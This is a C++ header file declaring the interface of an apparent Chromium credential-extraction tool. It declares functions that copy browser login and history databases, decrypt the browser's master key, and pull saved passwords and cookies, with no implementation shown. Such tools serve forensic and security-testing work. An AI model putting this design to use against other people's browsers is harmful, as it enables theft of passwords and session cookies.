#pragma once
#include <Windows.h>
#include <Wincrypt.h>
#include <fstream>
#include <iostream>
#include <iomanip>
#include <Shlobj.h>
#include <format>
#include "Browser.h"
#include "Utils.hpp"
#include "sqlite3.h"
#pragma comment(lib, "Crypt32.lib")

namespace Tool
{
	namespace Browsers
	{
		namespace ChromiumDecrypt
		{
			bool CopyHistoryDB(Tool::Browsers::Browser* const& BrowserType);
			sqlite3* OpenDatabase(std::string sDbFilePath);
			bool RetrievePasswords(Tool::Browsers::Browser* const& BrowserType);
			void CopyLoginDB(std::string& sNewLoginDbPath, Tool::Browsers::Browser& BrowserType);
			std::string UncryptMasterKey(std::string pbDataInput, std::string& sDecodedMasterKey);
			bool ExecuteSqlCommand(sqlite3* db, std::string query, Tool::Browsers::Browser& BrowserType, bool bForPasswords=true);
			static int PasswordsCallback(void* data, int argc, char** argv, char** azColName);
			static int CookiesCallback(void* data, int argc, char** argv, char** azColName);
			int ExtractPasswordsFromDB(int argc, char** argv, char** azColName, Tool::Browsers::Browser& BrowserType);
			bool RetrieveMasterKey(std::string& sDecodedMasterKey, Tool::Browsers::Browser* const& BrowserType);
			int ExtractCookiesFromDb(int argc, char** argv, char** azColName, Tool::Browsers::Browser& BrowserType);
		}
	}
}